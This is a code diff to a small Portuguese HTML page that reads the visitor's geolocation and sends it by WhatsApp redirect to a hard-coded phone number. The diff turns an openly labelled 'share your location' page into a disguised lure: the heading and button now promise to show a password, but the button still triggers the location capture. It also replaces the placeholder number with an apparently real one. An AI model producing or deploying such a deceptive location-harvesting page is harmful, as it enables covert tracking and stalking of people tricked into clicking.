@@ -4,8 +4,8 @@
   <title>Enviar Localização</title>
 </head>
 <body>
-  <h1>Clique para compartilhar sua localização</h1>
-  <button onclick="getLocation()">Enviar Localização</button>
+  <h1>Mostar senha</h1>
+  <button onclick="getLocation()">Senha</button>
 
   <script>
     function getLocation() {
@@ -20,7 +20,7 @@
       const latitude = position.coords.latitude;
       const longitude = position.coords.longitude;
 
-      const phone = "5511999999999"; // Substitua pelo seu número com DDI e DDD
+      const phone = "5592994583088"; // Substitua pelo seu número com DDI e DDD
       const message = `Minha localização: https://www.google.com/maps?q=${latitude},${longitude}`;
       window.location.href = `https://wa.me/${phone}?text=${encodeURIComponent(message)}`;
     }
